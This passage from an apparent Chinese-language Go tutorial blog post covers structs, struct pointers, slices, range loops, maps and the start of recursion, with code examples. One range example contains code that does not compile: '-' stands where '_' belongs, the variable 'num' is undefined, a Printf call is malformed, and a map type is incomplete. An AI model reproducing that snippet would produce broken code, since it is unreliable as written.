valuen&#125;</span><br></pre></td></tr></table></figure><blockquote><p>实例</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Books <span class="keyword">struct</span> &#123;</span><br><span class="line">title   <span class="type">string</span></span><br><span class="line">author  <span class="type">string</span></span><br><span class="line">subject <span class="type">string</span></span><br><span class="line">book_id <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//创建一个结构体</span></span><br><span class="line">book1 := Books&#123;<span class="string">&quot;gogogo&quot;</span>, <span class="string">&quot;psych&quot;</span>, <span class="string">&quot;go&quot;</span>, <span class="number">1</span>&#125;</span><br><span class="line">fmt.Println(book1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h6 id="访问结构体变量"><a href="#访问结构体变量" class="headerlink" title="访问结构体变量"></a>访问结构体变量</h6></blockquote><p>如果要访问结构体成员，需要使用点号 .  操作符，格式为： </p><p><code>结构体.成员名&quot;</code></p><p>实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Books <span class="keyword">struct</span> &#123;</span><br><span class="line">title   <span class="type">string</span></span><br><span class="line">author  <span class="type">string</span></span><br><span class="line">subject <span class="type">string</span></span><br><span class="line">book_id <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> book1 Books       <span class="comment">//声明book1位Books类型</span></span><br><span class="line">book1.title = <span class="string">&quot;Go 语言&quot;</span>   <span class="comment">//访问结构体变量并赋值</span></span><br><span class="line">book1.author = <span class="string">&quot;psych&quot;</span></span><br><span class="line">book1.subject = <span class="string">&quot;Go&quot;</span></span><br><span class="line">book1.book_id = <span class="number">2</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;book1 title is %s\n&quot;</span>, book1.title)</span><br><span class="line">fmt.Printf(<span class="string">&quot;book1 author is %s\n&quot;</span>, book1.author)</span><br><span class="line">fmt.Printf(<span class="string">&quot;book1 subject is %s\n&quot;</span>, book1.subject)</span><br><span class="line">fmt.Printf(<span class="string">&quot;book1 book_id is %d\n&quot;</span>, book1.book_id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h6 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h6></blockquote><p>可以定义指向结构体的指针类似于其他指针变量，格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> struct_pointer *Books</span><br></pre></td></tr></table></figure><p>以上定义的指针变量可以存储结构体变量的地址。查看结构体变量地址，可以将 &amp; 符号放置于结构体变量前：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct_pointer = &amp;Book1</span><br></pre></td></tr></table></figure><p>使用结构体指针访问结构体成员，使用 “.” 操作符：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct_pointer.title</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Books <span class="keyword">struct</span> &#123;</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> Book1 Books        <span class="comment">/* 声明 Book1 为 Books 类型 */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* book 1 描述 */</span></span><br><span class="line">   Book1.title = <span class="string">&quot;Go&quot;</span></span><br><span class="line">   Book1.author = <span class="string">&quot;psych&quot;</span></span><br><span class="line">   Book1.subject = <span class="string">&quot;Go&quot;</span></span><br><span class="line">   Book1.book_id = <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">/* 打印 Book1 信息 */</span></span><br><span class="line">   AAA(&amp;Book1)        <span class="comment">//传参进函数的时候是传的地址，直接把这个结构体的地址传进去，和数组差不多</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AAA</span><span class="params">( book *Books )</span></span> &#123;</span><br><span class="line">   fmt.Printf( <span class="string">&quot;Book title : %s\n&quot;</span>, book.title)</span><br><span class="line">   fmt.Printf( <span class="string">&quot;Book author : %s\n&quot;</span>, book.author)</span><br><span class="line">   fmt.Printf( <span class="string">&quot;Book subject : %s\n&quot;</span>, book.subject)</span><br><span class="line">   fmt.Printf( <span class="string">&quot;Book book_id : %d\n&quot;</span>, book.book_id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h4><ul><li>Go 语言切片是对数组的抽象。</li></ul><p>Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(“动态数组”)，与数组相比切片的<strong>长度是不固定</strong>的，可以追加元素，在追加时可能使切片的容量增大。</p><blockquote><h6 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h6></blockquote><p>你可以声明一个未指定大小的数组来定义切片：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier []<span class="keyword">type</span></span><br></pre></td></tr></table></figure><p>切片不需要说明长度。</p><p>或使用 <strong>make()</strong> 函数来创建切片:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice1 []<span class="keyword">type</span> = <span class="built_in">make</span>([]<span class="keyword">type</span>, <span class="built_in">len</span>)</span><br><span class="line"></span><br><span class="line">也可以简写为</span><br><span class="line"></span><br><span class="line"><span class="string">`slice1 := make([]type, len)`</span></span><br></pre></td></tr></table></figure><p>也可以指定容量，其中 <strong>capacity</strong> 为可选参数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">make</span>([]T, length, capacity)</span><br></pre></td></tr></table></figure><p>这里 len 是数组的长度并且也是切片的初始长度。</p><blockquote><h6 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s :=[] <span class="type">int</span> &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125; </span><br></pre></td></tr></table></figure><p>直接初始化切片，[] 表示是切片类型，**{1,2,3}** 初始化值依次是 1,2,3，其 <strong>cap&#x3D;len&#x3D;3</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s := arr[:] </span><br></pre></td></tr></table></figure><p>初始化切片 <strong>s</strong>，是数组 arr 的引用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s := arr[startIndex:endIndex] </span><br></pre></td></tr></table></figure><p>将 arr 中从下标 startIndex 到 endIndex-1 下的元素创建为一个新的切片。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s := arr[startIndex:] </span><br></pre></td></tr></table></figure><p>默认 endIndex 时将表示一直到arr的最后一个元素。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s := arr[:endIndex] </span><br></pre></td></tr></table></figure><p>默认 startIndex 时将表示从 arr 的第一个元素开始。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s1 := s[startIndex:endIndex] </span><br></pre></td></tr></table></figure><p>通过切片 s 初始化切片 s1。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s :=<span class="built_in">make</span>([]<span class="type">int</span>,<span class="built_in">len</span>,<span class="built_in">cap</span>) </span><br></pre></td></tr></table></figure><p>通过内置函数 <strong>make()</strong> 初始化切片<strong>s</strong>，**[]int** 标识为其元素类型为 int 的切片。</p><h6 id="len-和cap"><a href="#len-和cap" class="headerlink" title="len()和cap()"></a>len()和cap()</h6><p>切片是可索引的</p><ul><li>可以由 len() 方法<strong>获取长度</strong>。</li><li>切片提供了计算容量的方法 cap() 可以<strong>测量切片最长可以达到多少</strong>。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> nums = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">printSlice(nums)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printSlice</span><span class="params">(x []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;len=%d,cap=%d,slice=%v\n&quot;</span>, <span class="built_in">len</span>(x), <span class="built_in">cap</span>(x), x) <span class="comment">//len=3 cap=5 slice=[0 0 0]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><h6 id="空切片"><a href="#空切片" class="headerlink" title="空切片"></a>空切片</h6></blockquote><p>一个切片在未初始化之前默认为 nil，长度为 0</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> numbers []<span class="type">int</span></span><br><span class="line"></span><br><span class="line">   printSlice(numbers)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(numbers == <span class="literal">nil</span>)&#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;切片是空的&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printSlice</span><span class="params">(x []<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;len=%d cap=%d slice=%v\n&quot;</span>,<span class="built_in">len</span>(x),<span class="built_in">cap</span>(x),x)  <span class="comment">//len=0 cap=0 slice=[]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="append-和copy"><a href="#append-和copy" class="headerlink" title="append()和copy()"></a>append()和copy()</h6><p>如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> numbers []<span class="type">int</span></span><br><span class="line">   printSlice(numbers)   <span class="comment">//len=0 cap=0 slice=[]</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 允许追加空切片 */</span></span><br><span class="line">   numbers = <span class="built_in">append</span>(numbers, <span class="number">0</span>)</span><br><span class="line">   printSlice(numbers)    <span class="comment">//len=1 cap=1 slice=[0]</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 向切片添加一个元素 */</span></span><br><span class="line">   numbers = <span class="built_in">append</span>(numbers, <span class="number">1</span>)   <span class="comment">//len=2 cap=2 slice=[0 1]</span></span><br><span class="line">   printSlice(numbers)</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 同时添加多个元素 */</span></span><br><span class="line">   numbers = <span class="built_in">append</span>(numbers, <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)     <span class="comment">//len=5 cap=6 slice=[0 1 2 3 4]</span></span><br><span class="line">   printSlice(numbers)</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 创建切片 numbers1 是之前切片的两倍容量*/</span></span><br><span class="line">   numbers1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="built_in">len</span>(numbers), (<span class="built_in">cap</span>(numbers))*<span class="number">2</span>)     </span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 拷贝 numbers 的内容到 numbers1 */</span></span><br><span class="line">   <span class="built_in">copy</span>(numbers1,numbers)</span><br><span class="line">   printSlice(numbers1)       <span class="comment">//len=5 cap=12 slice=[0 1 2 3 4]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printSlice</span><span class="params">(x []<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;len=%d cap=%d slice=%v\n&quot;</span>,<span class="built_in">len</span>(x),<span class="built_in">cap</span>(x),x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="语言范围"><a href="#语言范围" class="headerlink" title="语言范围"></a>语言范围</h4><p>Go 语言中 range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对。</p><p>for 循环的 range 格式可以对 slice、map、数组、字符串等进行<strong>迭代循环</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> oldMap &#123;</span><br><span class="line">    newMap[key] = value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码中的 key 和 value 是可以省略。</p><p>如果只想读取 key，格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key := <span class="keyword">range</span> oldMap</span><br></pre></td></tr></table></figure><p>或者这样：</p><p>for key, _ :&#x3D; range oldMap</p><p>如果只想读取 value，格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> oldMap</span><br></pre></td></tr></table></figure><blockquote><p>实例：遍历简单的数组</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pow = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> i, v := <span class="keyword">range</span> pow &#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;2**%d = %d\n&quot;</span>, i, v)      <span class="comment">//相当于就是遍历</span></span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>for循环的range格式可以省略key和value</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    map1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">float32</span>)</span><br><span class="line">    map1[<span class="number">1</span>] = <span class="number">1.0</span></span><br><span class="line">    map1[<span class="number">2</span>] = <span class="number">2.0</span></span><br><span class="line">    map1[<span class="number">3</span>] = <span class="number">3.0</span></span><br><span class="line">    map1[<span class="number">4</span>] = <span class="number">4.0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取key和value</span></span><br><span class="line">    <span class="keyword">for</span> key,value := <span class="keyword">range</span> map1 &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;key is: %d - value is: %f\n&quot;</span>, key, value)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取key</span></span><br><span class="line">      <span class="keyword">for</span> key,_ := <span class="keyword">range</span> map1 &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;key is: %d \n&quot;</span>, key)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>range遍历其他数据结构</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"> <span class="comment">//使用range去求一个slice的和，使用数组跟这个很类似</span></span><br><span class="line">    nums := []<span class="type">int</span>&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> -,value := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        sum += num</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;sum:&quot;</span>sum)</span><br><span class="line">    <span class="comment">//使用range传入索引和值两个变量</span></span><br><span class="line">    <span class="keyword">for</span> i,num :=<span class="keyword">range</span> nums &#123;</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">3</span>&#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;index:&quot;</span>, i)    <span class="comment">//返回值为3的索引 -&gt;1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//range也可以用到map键值对上</span></span><br><span class="line">    kvs := <span class="keyword">map</span>[<span class="type">string</span>]&#123;<span class="string">&quot;a&quot;</span>: <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;b&quot;</span>: <span class="string">&quot;banana&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> k,v := <span class="keyword">range</span> kvs &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%s -&gt; %s\n&quot;</span>, k, v)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//range也可以用来枚举 Unicode 字符串。第一个参数是字符的索引，第二个是字符（Unicode的值）本身。</span></span><br><span class="line">    <span class="keyword">for</span> i, c := <span class="keyword">range</span> <span class="string">&quot;go&quot;</span> &#123;</span><br><span class="line">        fmt.Println(i, c)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Map-集合"><a href="#Map-集合" class="headerlink" title="Map(集合)"></a>Map(集合)</h4><p>Map 是一种无序的键值对的集合。它最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。</p><blockquote><h6 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h6></blockquote><p>可以使用内建函数 make 或使用 map 关键字来定义 Map:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 使用 make 函数 */</span></span><br><span class="line">map_variable := <span class="built_in">make</span>(<span class="keyword">map</span>[KeyType]ValueType, initialCapacity)</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个空的 Map</span></span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个初始容量为 10 的 Map</span></span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>也可以使用字面量创建Map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;</span><br><span class="line">    <span class="string">&quot;apple&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;banana&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;orange&quot;</span>: <span class="number">3</span>,   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取键值对</span></span><br><span class="line">v1 := m[<span class="string">&quot;apple&quot;</span>]  </span><br><span class="line">v2,ok := m[<span class="string">&quot;peer&quot;</span>]   <span class="comment">//如果键不存在，ok的值为false，v2的值为该类型[int]的零值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改键值对</span></span><br><span class="line">m[<span class="string">&quot;apple&quot;</span>] = <span class="number">5</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Map的长度</span></span><br><span class="line"><span class="built_in">len</span> := <span class="built_in">len</span>(m)   </span><br><span class="line"></span><br><span class="line"> <span class="comment">//遍历Map</span></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;     </span><br><span class="line">    fmt.Printf(<span class="string">&quot;key=%s, value=%d\n&quot;</span>, k, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除键值对</span></span><br><span class="line"><span class="built_in">delete</span>(m, <span class="string">&quot;banana&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>Go中递归的格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">recursion</span><span class="params">()</span></span> &#123;</span><br><span class="line">   recursion() <span class="comment">/* 函数调用自身 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   recursion()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>求平方根</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">x := <span class="number">27.0</span></span><br><span class="line">sqr := sqrt(x)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%.2f 的平方根为 %.6f\n&quot;</span>, x, sqr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 